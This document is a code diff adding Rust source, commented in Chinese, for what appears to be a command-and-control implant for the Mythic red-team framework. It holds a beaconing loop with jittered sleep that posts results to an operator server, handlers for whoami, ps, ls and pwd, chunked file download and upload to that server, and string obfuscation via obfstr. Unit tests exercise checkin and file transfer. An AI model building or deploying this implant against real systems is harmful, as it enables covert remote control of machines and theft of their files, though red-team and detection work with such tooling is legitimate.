+                // 仅在网络成功回传确认后清除已交付的回执缓冲，弱网时保留重试以防任务挂起
+                exec_ws.clear();
+
+                if let Ok(task_resp) = self.parse_tasking_response(&server_resp_buf[..recv_len], &mut workspace.raw_buf) {
+                    // 处理服务端针对顺风车 responses 的处理确认回执 (如返回 file_id / chunk ack)
+                    if let Some(ref responses) = task_resp.responses {
+                        self.handle_server_post_responses(responses.as_slice());
+                    }
+
+                    // 派发下发的新任务
+                    for task in &task_resp.tasks {
+                        self.dispatch_task(task, &mut exec_ws);
+                    }
+                }
+            }
+
+            // 若收到退出标记或外部卸载信号，若有未传回执（如 exit 确认），执行最后一次原子外发回传
+            if (self.should_exit || crate::is_shutdown_requested()) && !exec_ws.is_empty() {
+                let mut resp_items = StackVec::<TaskResponseItem<'_>, 16>::new();
+                exec_ws.build_items(&mut resp_items);
+                if !resp_items.is_empty() {
+                    if let Ok(b64_len) = self.build_get_tasking_payload(Some(resp_items.as_slice()), &mut workspace) {
+                        let _ = transport.post_exchange(post_uri, &workspace.b64_buf[..b64_len], &mut server_resp_buf);
+                    }
+                }
+                break;
+            }
+
+            let sleep_secs = self.calculate_jittered_sleep();
+            self.interruptible_sleep(sleep_secs);
+        }
+    }
+
+    #[cfg(not(windows))]
+    pub fn run(&mut self) {
+        // 非 Windows 环境占位实现
+    }
+}
+
+/// 零堆提取参数字段（兼容 Mythic UI 模态框下发的 JSON 格式 `{"field": "value"}` 与 CLI 原生传参）
+#[inline]
+pub fn extract_param<'a>(raw: &'a str, key: &str) -> &'a str {
+    let trimmed = raw.trim();
+    if !trimmed.starts_with('{') {
+        return trimmed.trim_matches('"');
+    }
+    let key_bytes = key.as_bytes();
+    let bytes = trimmed.as_bytes();
+    let mut search_start = 0;
+
+    while let Some(pos) = trimmed[search_start..].find(key) {
+        let abs_pos = search_start + pos;
+        let before_ok = abs_pos > 0 && bytes[abs_pos - 1] == b'"';
+        let after_pos = abs_pos + key_bytes.len();
+        let after_quote_ok = after_pos < bytes.len() && bytes[after_pos] == b'"';
+
+        if before_ok && after_quote_ok {
+            let rest = &trimmed[after_pos + 1..];
+            let trimmed_rest = rest.trim_start();
+            if let Some(after_colon) = trimmed_rest.strip_prefix(':') {
+                let val_str = after_colon.trim_start();
+                if let Some(inside) = val_str.strip_prefix('"') {
+                    let val_bytes = inside.as_bytes();
+                    let mut i = 0;
+                    while i < val_bytes.len() {
+                        if val_bytes[i] == b'"' {
+                            let mut bs_count = 0;
+                            let mut j = i;
+                            while j > 0 && val_bytes[j - 1] == b'\\' {
+                                bs_count += 1;
+                                j -= 1;
+                            }
+                            if bs_count % 2 == 0 {
+                                return &inside[..i];
+                            }
+                        }
+                        i += 1;
+                    }
+                    return inside;
+                } else {
+                    let end = val_str
+                        .find(|c: char| c == ',' || c == '}' || c.is_whitespace())
+                        .unwrap_or(val_str.len());
+                    return &val_str[..end];
+                }
+            }
+        }
+        search_start = abs_pos + 1;
+    }
+    ""
+}
+
+/// 零堆从文件路径中截取纯文件名
+#[inline]
+pub fn extract_filename(path: &str) -> &str {
+    let clean = path.trim_end_matches(['\\', '/']);
+    if let Some(pos) = clean.rfind(['\\', '/']) {
+        &clean[pos + 1..]
+    } else {
+        clean
+    }
+}
+
+/// 单项下载元数据存储暂存
+#[derive(Clone, Copy)]
+#[cfg_attr(any(debug_assertions, test), derive(Debug))]
+pub struct DownloadItemMeta {
+    pub is_set: bool,
+    pub total_size: Option<i64>,
+    pub file_id: [u8; 36],
+    pub file_id_len: usize,
+    pub chunk_offset: Option<u64>,
+    pub chunk_data_offset: usize,
+    pub chunk_data_len: usize,
+    pub full_path_offset: usize,
+    pub full_path_len: usize,
+    pub filename_offset: usize,
+    pub filename_len: usize,
+    pub is_screenshot: Option<bool>,
+    pub resume: Option<bool>,
+}
+
+impl DownloadItemMeta {
+    pub const fn new() -> Self {
+        Self {
+            is_set: false,
+            total_size: None,
+            file_id: [0u8; 36],
+            file_id_len: 0,
+            chunk_offset: None,
+            chunk_data_offset: 0,
+            chunk_data_len: 0,
+            full_path_offset: 0,
+            full_path_len: 0,
+            filename_offset: 0,
+            filename_len: 0,
+            is_screenshot: None,
+            resume: None,
+        }
+    }
+}
+
+impl Default for DownloadItemMeta {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+/// 单项上传元数据存储暂存
+#[derive(Clone, Copy)]
+#[cfg_attr(any(debug_assertions, test), derive(Debug))]
+pub struct UploadItemMeta {
+    pub is_set: bool,
+    pub chunk_size: u32,
+    pub file_id: [u8; 36],
+    pub file_id_len: usize,
+    pub chunk_num: u32,
+    pub full_path_offset: usize,
+    pub full_path_len: usize,
+}
+
+impl UploadItemMeta {
+    pub const fn new() -> Self {
+        Self {
+            is_set: false,
+            chunk_size: 0,
+            file_id: [0u8; 36],
+            file_id_len: 0,
+            chunk_num: 0,
+            full_path_offset: 0,
+            full_path_len: 0,
+        }
+    }
+}
+
+impl Default for UploadItemMeta {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+/// 任务执行回显与状态暂存工作区 (Zero-Heap Task Execution Workspace)
+#[cfg_attr(any(debug_assertions, test), derive(Debug))]
+pub struct TaskExecutionWorkspace {
+    output_buf: [u8; 16384],
+    output_len: usize,
+    output_offsets: [usize; 16],
+    output_lens: [usize; 16],
+    task_ids: [[u8; 36]; 16],
+    task_id_lens: [usize; 16],
+    is_success: [bool; 16],
+    is_completed: [bool; 16],
+    download_metas: [DownloadItemMeta; 16],
+    upload_metas: [UploadItemMeta; 16],
+    count: usize,
+}
+
+impl Drop for TaskExecutionWorkspace {
+    fn drop(&mut self) {
+        crate::buffer::zeroize_slice(&mut self.output_buf);
+    }
+}
+
+impl Default for TaskExecutionWorkspace {
+    fn default() -> Self {
+        Self::new()
+    }
+}
+
+impl TaskExecutionWorkspace {
+    pub const fn new() -> Self {
+        Self {
+            output_buf: [0u8; 16384],
+            output_len: 0,
+            output_offsets: [0usize; 16],
+            output_lens: [0usize; 16],
+            task_ids: [[0u8; 36]; 16],
+            task_id_lens: [0usize; 16],
+            is_success: [false; 16],
+            is_completed: [false; 16],
+            download_metas: [DownloadItemMeta::new(); 16],
+            upload_metas: [UploadItemMeta::new(); 16],
+            count: 0,
+        }
+    }
+
+    pub fn clear(&mut self) {
+        if self.output_len > 0 {
+            crate::buffer::zeroize_slice(&mut self.output_buf[..self.output_len]);
+        }
+        self.output_len = 0;
+        self.count = 0;
+        self.download_metas = [DownloadItemMeta::new(); 16];
+        self.upload_metas = [UploadItemMeta::new(); 16];
+    }
+
+    pub fn record_response(
+        &mut self,
+        task_id: &str,
+        output: &str,
+        success: bool,
+        completed: bool,
+    ) -> bool {
+        if self.count >= 16 || task_id.len() > 36 || self.output_len.saturating_add(output.len()) > self.output_buf.len() {
+            return false;
+        }
+
+        let idx = self.count;
+        self.task_ids[idx][..task_id.len()].copy_from_slice(task_id.as_bytes());
+        self.task_id_lens[idx] = task_id.len();
+
+        let start = self.output_len;
+        let end = start + output.len();
+        self.output_buf[start..end].copy_from_slice(output.as_bytes());
+        self.output_offsets[idx] = start;
+        self.output_lens[idx] = output.len();
+        self.output_len = end;
+
+        self.is_success[idx] = success;
+        self.is_completed[idx] = completed;
+        self.download_metas[idx] = DownloadItemMeta::new();
+        self.upload_metas[idx] = UploadItemMeta::new();
+        self.count += 1;
+        true
+    }
+
+    pub fn record_download_response(
+        &mut self,
+        task_id: &str,
+        download: FileDownloadResponse<'_>,
+        output: &str,
+        success: bool,
+        completed: bool,
+    ) -> bool {
+        if self.count >= 16 || task_id.len() > 36 {
+            return false;
+        }
+        let idx = self.count;
+        if !self.record_response(task_id, output, success, completed) {
+            return false;
+        }
+
+        let mut meta = DownloadItemMeta::new();
+        meta.is_set = true;
+        meta.total_size = download.total_size;
+        meta.chunk_offset = download.chunk_offset;
+        meta.is_screenshot = download.is_screenshot;
+        meta.resume = download.resume;
+
+        if let Some(fid) = download.file_id {
+            let flen = fid.len().min(36);
+            meta.file_id[..flen].copy_from_slice(&fid.as_bytes()[..flen]);
+            meta.file_id_len = flen;
+        }
+
+        if let Some(cdata) = download.chunk_data {
+            let start = self.output_len;
+            let end = start + cdata.len();
+            if end <= self.output_buf.len() {
+                self.output_buf[start..end].copy_from_slice(cdata.as_bytes());
+                self.output_len = end;
+                meta.chunk_data_offset = start;
+                meta.chunk_data_len = cdata.len();
+            }
+        }
+
+        if let Some(path) = download.full_path {
+            let start = self.output_len;
+            let end = start + path.len();
+            if end <= self.output_buf.len() {
+                self.output_buf[start..end].copy_from_slice(path.as_bytes());
+                self.output_len = end;
+                meta.full_path_offset = start;
+                meta.full_path_len = path.len();
+            }
+        }
+
+        if let Some(fname) = download.filename {
+            let start = self.output_len;
+            let end = start + fname.len();
+            if end <= self.output_buf.len() {
+                self.output_buf[start..end].copy_from_slice(fname.as_bytes());
+                self.output_len = end;
+                meta.filename_offset = start;
+                meta.filename_len = fname.len();
+            }
+        }
+
+        self.download_metas[idx] = meta;
+        true
+    }
+
+    pub fn record_upload_response(
+        &mut self,
+        task_id: &str,
+        upload: FileUploadRequest<'_>,
+        output: &str,
+        success: bool,
+        completed: bool,
+    ) -> bool {
+        if self.count >= 16 || task_id.len() > 36 {
+            return false;
+        }
+        let idx = self.count;
+        if !self.record_response(task_id, output, success, completed) {
+            return false;
+        }
+
+        let mut meta = UploadItemMeta::new();
+        meta.is_set = true;
+        meta.chunk_size = upload.chunk_size;
+        meta.chunk_num = upload.chunk_num;
+
+        let flen = upload.file_id.len().min(36);
+        meta.file_id[..flen].copy_from_slice(&upload.file_id.as_bytes()[..flen]);
+        meta.file_id_len = flen;
+
+        if let Some(path) = upload.full_path {
+            let start = self.output_len;
+            let end = start + path.len();
+            if end <= self.output_buf.len() {
+                self.output_buf[start..end].copy_from_slice(path.as_bytes());
+                self.output_len = end;
+                meta.full_path_offset = start;
+                meta.full_path_len = path.len();
+            }
+        }
+
+        self.upload_metas[idx] = meta;
+        true
+    }
+
+    #[inline]
+    fn status_success() -> &'static str {
+        static CELL: std::sync::OnceLock<[u8; 7]> = std::sync::OnceLock::new();
+        let bytes = CELL.get_or_init(|| {
+            obfstr::obfstr!(let s = "success";);
+            let mut b = [0u8; 7];
+            b.copy_from_slice(s.as_bytes());
+            b
+        });
+        match core::str::from_utf8(bytes) {
+            Ok(s) => s,
+            Err(_) => "",
+        }
+    }
+
+    #[inline]
+    fn status_error() -> &'static str {
+        static CELL: std::sync::OnceLock<[u8; 5]> = std::sync::OnceLock::new();
+        let bytes = CELL.get_or_init(|| {
+            obfstr::obfstr!(let s = "error";);
+            let mut b = [0u8; 5];
+            b.copy_from_slice(s.as_bytes());
+            b
+        });
+        match core::str::from_utf8(bytes) {
+            Ok(s) => s,
+            Err(_) => "",
+        }
+    }
+
+    pub fn build_items<'a>(&'a self, out_vec: &mut crate::buffer::StackVec<TaskResponseItem<'a>, 16>) {
+        out_vec.clear();
+        for i in 0..self.count {
+            let tid = core::str::from_utf8(&self.task_ids[i][..self.task_id_lens[i]]).unwrap_or("");
+            let start = self.output_offsets[i];
+            let end = start + self.output_lens[i];
+            let out_str = core::str::from_utf8(&self.output_buf[start..end]).unwrap_or("");
+            let status = if self.is_success[i] {
+                Self::status_success()
+            } else {
+                Self::status_error()
+            };
+            let mut item = TaskResponseItem::new(tid, out_str, self.is_completed[i])
+                .with_status(status);
+
+            if self.download_metas[i].is_set {
+                let meta = &self.download_metas[i];
+                let file_id_str = if meta.file_id_len > 0 {
+                    core::str::from_utf8(&meta.file_id[..meta.file_id_len]).ok()
+                } else {
+                    None
+                };
+                let chunk_data_str = if meta.chunk_data_len > 0 {
+                    core::str::from_utf8(&self.output_buf[meta.chunk_data_offset..meta.chunk_data_offset + meta.chunk_data_len]).ok()
+                } else {
+                    None
+                };
+                let full_path_str = if meta.full_path_len > 0 {
+                    core::str::from_utf8(&self.output_buf[meta.full_path_offset..meta.full_path_offset + meta.full_path_len]).ok()
+                } else {
+                    None
+                };
+                let filename_str = if meta.filename_len > 0 {
+                    core::str::from_utf8(&self.output_buf[meta.filename_offset..meta.filename_offset + meta.filename_len]).ok()
+                } else {
+                    None
+                };
+                item.download = Some(FileDownloadResponse {
+                    total_size: meta.total_size,
+                    chunk_size: None,
+                    full_path: full_path_str,
+                    host: None,
+                    filename: filename_str,
+                    is_screenshot: meta.is_screenshot,
+                    file_id: file_id_str,
+                    chunk_offset: meta.chunk_offset,
+                    chunk_data: chunk_data_str,
+                    resume: meta.resume,
+                });
+            }
+
+            if self.upload_metas[i].is_set {
+                let meta = &self.upload_metas[i];
+                let file_id_str = core::str::from_utf8(&meta.file_id[..meta.file_id_len]).unwrap_or("");
+                let full_path_str = if meta.full_path_len > 0 {
+                    core::str::from_utf8(&self.output_buf[meta.full_path_offset..meta.full_path_offset + meta.full_path_len]).ok()
+                } else {
+                    None
+                };
+                item.upload = Some(FileUploadRequest {
+                    chunk_size: meta.chunk_size,
+                    file_id: file_id_str,
+                    chunk_num: meta.chunk_num,
+                    full_path: full_path_str,
+                });
+            }
+
+            let _ = out_vec.push(item);
+        }
+    }
+
+    pub fn len(&self) -> usize {
+        self.count
+    }
+
+    pub fn is_empty(&self) -> bool {
+        self.count == 0
+    }
+}
+
+#[inline]
+fn format_u64_local(dst: &mut [u8], mut val: u64) -> usize {
+    if val == 0 {
+        if !dst.is_empty() {
+            dst[0] = b'0';
+            return 1;
+        }
+        return 0;
+    }
+    let mut temp = [0u8; 20];
+    let mut count = 0;
+    while val > 0 && count < 20 {
+        temp[count] = b'0' + (val % 10) as u8;
+        val /= 10;
+        count += 1;
+    }
+    let mut written = 0;
+    for i in (0..count).rev() {
+        if written < dst.len() {
+            dst[written] = temp[i];
+            written += 1;
+        }
+    }
+    written
+}
+
+#[cfg(windows)]
+#[allow(clippy::upper_case_acronyms)]
+mod win32 {
+    pub type BOOL = i32;
+    #[link(name = "kernel32")]
+    unsafe extern "system" {
+        pub fn GetCurrentDirectoryW(nBufferLength: u32, lpBuffer: *mut u16) -> u32;
+        pub fn SetCurrentDirectoryW(lpPathName: *const u16) -> BOOL;
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_agent_session_lifecycle() {
+        let master_key = [0x42u8; 32];
+        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
+        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");
+
+        assert_eq!(session.active_uuid_str(), "11111111-2222-3333-4444-555555555555");
+        assert!(!session.is_registered());
+
+        // 1. 测试休眠抖动计算
+        session.update_sleep(10, 20);
+        let s = session.calculate_jittered_sleep();
+        assert!((8..=12).contains(&s), "休眠时间需在 10s ± 20% (8~12s) 之间");
+
+        // 2. 测试上线封包构建 (零堆分配)
+        let mut ws = ActiveStackWorkspace::new();
+        let mut sys_ws = SysInfoWorkspace::new();
+        let b64_len = session.build_checkin_payload(&mut ws, &mut sys_ws).expect("build checkin");
+        assert!(b64_len > 0);
+
+        // 3. 测试未上线直接拉取任务熔断
+        assert_eq!(
+            session.build_get_tasking_payload(None, &mut ws).unwrap_err(),
+            WisconsinError::Agent(AgentError::NotCheckedIn)
+        );
+
+        // 4. 模拟服务端返回 Checkin 回执并激活 Callback UUID
+        let callback_uuid = "88888888-7777-6666-5555-444444444444";
+        let checkin_resp_json = format!(
+            r#"{{"action":"checkin","status":"success","id":"{}"}}"#,
+            callback_uuid
+        );
+
+        // 借用 HttpProfile 加密生成合法服务端回包
+        let http = HttpProfile::new("", "", session.active_uuid_str(), &session.crypto);
+        let mut srv_ws = ActiveStackWorkspace::new();
+        let srv_b64_len = http
+            .pack_bytes(checkin_resp_json.as_bytes(), &mut srv_ws.raw_buf, &mut srv_ws.b64_buf)
+            .expect("server pack");
+
+        let parsed = session
+            .handle_checkin_response(&srv_ws.b64_buf[..srv_b64_len], &mut ws.raw_buf)
+            .expect("handle checkin resp");
+
+        assert_eq!(parsed.status, "success");
+        assert!(session.is_registered());
+        assert_eq!(session.active_uuid_str(), callback_uuid);
+
+        // 5. 现已成功注册，允许构建心跳轮询
+        let tasking_b64_len = session
+            .build_get_tasking_payload(None, &mut ws)
+            .expect("build get_tasking");
+        assert!(tasking_b64_len > 0);
+    }
+
+    #[test]
+    fn test_task_dispatch_and_execution_workspace() {
+        let master_key = [0x42u8; 32];
+        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
+        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");
+
+        let mut exec_ws = TaskExecutionWorkspace::new();
+
+        // 1. 测试 sleep 指令分发
+        let sleep_task = crate::protocol::MythicTaskRef::new("task-sleep", "sleep", "15 25");
+        session.dispatch_task(&sleep_task, &mut exec_ws);
+        assert_eq!(session.sleep_interval(), 15);
+        assert_eq!(session.sleep_jitter(), 25);
+        assert_eq!(exec_ws.len(), 1);
+
+        // 2. 测试 pwd 指令分发
+        let pwd_task = crate::protocol::MythicTaskRef::new("task-pwd", "pwd", "");
+        session.dispatch_task(&pwd_task, &mut exec_ws);
+        assert_eq!(exec_ws.len(), 2);
+
+        // 3. 测试 whoami 指令分发
+        let whoami_task = crate::protocol::MythicTaskRef::new("task-whoami", "whoami", "");
+        session.dispatch_task(&whoami_task, &mut exec_ws);
+        assert_eq!(exec_ws.len(), 3);
+
+        // 4. 测试 ls 指令分发
+        let ls_task = crate::protocol::MythicTaskRef::new("task-ls", "ls", ".");
+        session.dispatch_task(&ls_task, &mut exec_ws);
+        assert_eq!(exec_ws.len(), 4);
+
+        // 5. 测试 ps 指令分发
+        let ps_task = crate::protocol::MythicTaskRef::new("task-ps", "ps", "");
+        session.dispatch_task(&ps_task, &mut exec_ws);
+        assert_eq!(exec_ws.len(), 5);
+
+        // 6. 测试 未知 指令分发
+        let unk_task = crate::protocol::MythicTaskRef::new("task-unk", "invalid_cmd", "");
+        session.dispatch_task(&unk_task, &mut exec_ws);
+        assert_eq!(exec_ws.len(), 6);
+
+        // 7. 校验 TaskResponseItem 导出
+        {
+            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
+            exec_ws.build_items(&mut items);
+            assert_eq!(items.len(), 6);
+            assert_eq!(items[0].task_id, "task-sleep");
+            assert_eq!(items[0].status, Some("success"));
+            assert_eq!(items[3].task_id, "task-ls");
+            assert_eq!(items[3].status, Some("success"));
+            assert_eq!(items[4].task_id, "task-ps");
+            assert_eq!(items[4].status, Some("success"));
+            assert_eq!(items[5].task_id, "task-unk");
+            assert_eq!(items[5].status, Some("error"));
+        }
+
+        // 8. 测试 exit 指令分发
+        let exit_task = crate::protocol::MythicTaskRef::new("task-exit", "exit", "");
+        session.dispatch_task(&exit_task, &mut exec_ws);
+        assert!(session.should_exit());
+
+        // 9. 测试 extract_param 与 UI JSON 传参解析
+        assert_eq!(extract_param(r#"{"path":"C:\\temp"}"#, "path"), r#"C:\\temp"#);
+        assert_eq!(extract_param(r#"{"interval":10,"jitter":25}"#, "interval"), "10");
+        assert_eq!(extract_param(r#"{"interval":10,"jitter":25}"#, "jitter"), "25");
+        assert_eq!(extract_param(r#"C:\temp"#, "path"), r#"C:\temp"#);
+
+        // 10. 测试 UI JSON 形式的 sleep 指令
+        let sleep_json_task = crate::protocol::MythicTaskRef::new("task-sleep-json", "sleep", r#"{"interval": 20, "jitter": 30}"#);
+        session.dispatch_task(&sleep_json_task, &mut exec_ws);
+        assert_eq!(session.sleep_interval(), 20);
+        assert_eq!(session.sleep_jitter(), 30);
+
+        // 11. 测试 download 与 upload 指令分发
+        let dl_task = crate::protocol::MythicTaskRef::new("task-dl", "download", r#"{"file_path": "Cargo.toml"}"#);
+        session.dispatch_task(&dl_task, &mut exec_ws);
+        assert!(session.active_download.is_some());
+
+        let ul_task = crate::protocol::MythicTaskRef::new("task-ul", "upload", r#"{"file": "11111111-2222-3333-4444-555555555555", "remote_path": "target\\temp_ul.bin"}"#);
+        session.dispatch_task(&ul_task, &mut exec_ws);
+        assert!(session.active_upload.is_some());
+
+        // 校验 download 与 upload 的任务挂载载荷
+        let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
+        exec_ws.build_items(&mut items);
+        assert_eq!(items.len(), 10);
+        assert!(items[8].download.is_some());
+        assert_eq!(items[8].task_id, "task-dl");
+        assert!(items[9].upload.is_some());
+        assert_eq!(items[9].task_id, "task-ul");
+    }
+
+    #[test]
+    fn test_engine_file_transfer_coupling() {
+        let master_key = [0x42u8; 32];
+        let payload_uuid = *b"11111111-2222-3333-4444-555555555555";
+        let mut session = AgentSession::new(&master_key, &payload_uuid).expect("create session");
+        let mut exec_ws = TaskExecutionWorkspace::new();
+        let mut ws = ActiveStackWorkspace::new();
+
+        // 1. 触发下载 Cargo.toml
+        let dl_task = crate::protocol::MythicTaskRef::new("task-dl-2", "download", r#"{"file_path": "Cargo.toml"}"#);
+        session.dispatch_task(&dl_task, &mut exec_ws);
+        assert!(session.active_download.is_some());
+
+        {
+            let mut items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
+            exec_ws.build_items(&mut items);
+            assert_eq!(items.len(), 1);
+            let dl_resp = items[0].download.expect("download registration must be present");
+            assert!(dl_resp.total_size.is_some());
+            assert!(dl_resp.filename.is_some());
+        }
+
+        // 2. 模拟服务端下发注册 ACK (返回分配的 file_id)
+        let srv_file_id = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
+        let ack_item = ServerTaskPostResponseItem {
+            task_id: "task-dl-2",
+            status: "success",
+            file_id: Some(srv_file_id),
+            ..Default::default()
+        };
+        session.handle_server_post_responses(&[ack_item]);
+        let dl_state = session.active_download.expect("download state still exists");
+        assert!(dl_state.is_registered);
+        assert_eq!(dl_state.file_id_str(), Some(srv_file_id));
+
+        // 3. 推进步进，读取第一片切片
+        exec_ws.clear();
+        session.step_file_transfers(&mut exec_ws, &mut ws);
+        {
+            let mut chunk_items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
+            exec_ws.build_items(&mut chunk_items);
+            assert_eq!(chunk_items.len(), 1);
+            let chunk_resp = chunk_items[0].download.expect("chunk payload must be present");
+            assert_eq!(chunk_resp.file_id, Some(srv_file_id));
+            assert!(chunk_resp.chunk_data.is_some());
+            assert_eq!(chunk_resp.chunk_offset, Some(0));
+        }
+
+        // 4. 触发上传测试
+        let _ = std::fs::remove_file("target\\test_ul.txt");
+        exec_ws.clear();
+        let ul_task = crate::protocol::MythicTaskRef::new(
+            "task-ul-2",
+            "upload",
+            r#"{"file": "99999999-8888-7777-6666-555555555555", "remote_path": "target\\test_ul.txt"}"#,
+        );
+        session.dispatch_task(&ul_task, &mut exec_ws);
+        assert!(session.active_upload.is_some());
+
+        {
+            let mut ul_items = crate::buffer::StackVec::<TaskResponseItem<'_>, 16>::new();
+            exec_ws.build_items(&mut ul_items);
+            assert_eq!(ul_items.len(), 1);
+            let ul_req = ul_items[0].upload.expect("upload request must be present");
+            assert_eq!(ul_req.chunk_num, 1);
+            assert_eq!(ul_req.file_id, "99999999-8888-7777-6666-555555555555");
+        }
+
+        // 5. 模拟服务端下发第一片 Base64 密文并落盘
+        let test_data_b64 = "SGVsbG8gTXl0aGlj"; // "Hello Mythic"
+        let ul_ack = ServerTaskPostResponseItem {
+            task_id: "task-ul-2",
+            status: "success",
+            file_id: Some("99999999-8888-7777-6666-555555555555"),
+            chunk_num: Some(1),
+            total_chunks: Some(1),
+            chunk_data: Some(test_data_b64),
+            ..Default::default()
+        };
+        session.handle_server_post_responses(&[ul_ack]);
+        let ul_state = session.active_upload.expect("upload state");
+        assert!(ul_state.is_complete);
+
+        // 验证文件写入成功
+        let written = std::fs::read_to_string("target\\test_ul.txt").expect("read uploaded file");
+        assert_eq!(written, "Hello Mythic");
+        let _ = std::fs::remove_file("target\\test_ul.txt");
+    }
+
+    #[test]
+    fn test_extract_param_advanced_edge_cases() {
+        // 1. 验证字段名存在前缀子串碰撞时的精确匹配 (杜绝 "file_path" 误匹配为 "path")
+        let collision_json = r#"{"file_path":"first.bin","path":"second.bin"}"#;
+        assert_eq!(extract_param(collision_json, "file_path"), "first.bin");
+        assert_eq!(extract_param(collision_json, "path"), "second.bin");
+
+        // 2. 验证键名出现在其他字段的值内容中时的防误判
+        let val_contain_json = r#"{"comment":"the path is safe","path":"real_path.txt"}"#;
+        assert_eq!(extract_param(val_contain_json, "path"), "real_path.txt");
+
+        // 3. 验证 JSON 中缺失字段时严格返回空字符串 (不再误返回整个 JSON 串)
+        let missing_json = r#"{"interval":10}"#;
+        assert_eq!(extract_param(missing_json, "path"), "");
+        assert_eq!(extract_param(missing_json, "jitter"), "");
+
+        // 4. 验证冒号两侧含空格的 JSON
+        let spaced_json = r#"{"path" : "C:\\spaced\\dir"}"#;
+        assert_eq!(extract_param(spaced_json, "path"), r#"C:\\spaced\\dir"#);
+
+        // 5. 验证非 JSON 命令行多参数/带双引号输入
+        assert_eq!(extract_param(r#""C:\Program Files\App""#, "path"), r#"C:\Program Files\App"#);
+        assert_eq!(extract_param("", "path"), "");
+    }
+
+    #[test]
+    fn test_active_upload_short_id_slice_safety() {
+        let ul = ActiveUpload::new("task-short", "short-uuid", "C:\\temp\\file.bin", 4096);
+        assert_eq!(ul.task_id_str(), "task-short");
+        assert_eq!(ul.file_id_str(), "short-uuid");
+        assert_eq!(ul.path_str(), "C:\\temp\\file.bin");
+        // 确保不会有多余的 \0 空字节泄漏
+        assert_eq!(ul.file_id_str().len(), 10);
+    }
+
+    #[test]
+    fn test_workspace_zeroization() {
+        let mut ws = TaskExecutionWorkspace::new();
+        assert!(ws.is_empty());
+        ws.record_response("task-sec", "sensitive memory data", true, true);
+        assert_eq!(ws.len(), 1);
+        ws.clear();
+        assert_eq!(ws.len(), 0);
+        // 校验已写区域被物理擦除刷零
+        assert_eq!(&ws.output_buf[..21], &[0u8; 21]);
+    }
+}
